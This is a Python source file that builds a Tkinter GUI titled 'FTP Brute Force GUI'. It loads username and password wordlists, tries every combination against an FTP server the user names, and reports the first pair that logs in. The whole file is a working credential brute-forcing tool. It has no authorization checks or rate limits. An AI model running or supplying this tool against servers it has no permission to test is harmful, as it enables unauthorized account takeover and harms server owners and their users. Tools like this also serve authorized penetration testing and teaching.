#!/usr/bin/python3

import ftplib
from tkinter import Tk, Label, Entry, Button, Text, filedialog, END

def start_bruteforce():
    server = server_entry.get()
    user_list_path = user_list_entry.get()
    password_list_path = password_list_entry.get()

    try:
        with open(user_list_path, 'r', encoding='latin-1') as user_list, open(password_list_path, 'r', encoding='latin-1') as pw_list:
            users = [user.strip('\r\n') for user in user_list]
            passwords = [password.strip('\r\n') for password in pw_list]

            for user in users:
                for password in passwords:
                    try:
                        ftp = ftplib.FTP(server)
                        ftp.login(user, password)
                        result_text.insert(END, f"Success! Username: '{user}', Password: '{password}'\n")
                        ftp.quit()
                        return
                    except ftplib.error_perm:
                        result_text.insert(END, f"Failed: Username: '{user}', Password: '{password}'\n")
    except FileNotFoundError as e:
        result_text.insert(END, f"File error: {e}\n")
    except Exception as exc:
        result_text.insert(END, f"An error occurred: {exc}\n")

def browse_user_file():
    file_path = filedialog.askopenfilename()
    user_list_entry.delete(0, END)
    user_list_entry.insert(0, file_path)

def browse_password_file():
    file_path = filedialog.askopenfilename()
    password_list_entry.delete(0, END)
    password_list_entry.insert(0, file_path)

root = Tk()
root.title("FTP Brute Force GUI")

Label(root, text="FTP Server:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
server_entry = Entry(root, width=40)
server_entry.grid(row=0, column=1, padx=5, pady=5)

Label(root, text="Usernames File:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
user_list_entry = Entry(root, width=40)
user_list_entry.grid(row=1, column=1, padx=5, pady=5)
Button(root, text="Browse", command=browse_user_file).grid(row=1, column=2, padx=5, pady=5)

Label(root, text="Passwords File:").grid(row=2, column=0, padx=5, pady=5, sticky="w")
password_list_entry = Entry(root, width=40)
password_list_entry.grid(row=2, column=1, padx=5, pady=5)
Button(root, text="Browse", command=browse_password_file).grid(row=2, column=2, padx=5, pady=5)

Button(root, text="Start", command=start_bruteforce).grid(row=3, column=1, pady=10)

result_text = Text(root, width=60, height=15)
result_text.grid(row=4, column=0, columnspan=3, padx=5, pady=5)

root.mainloop()

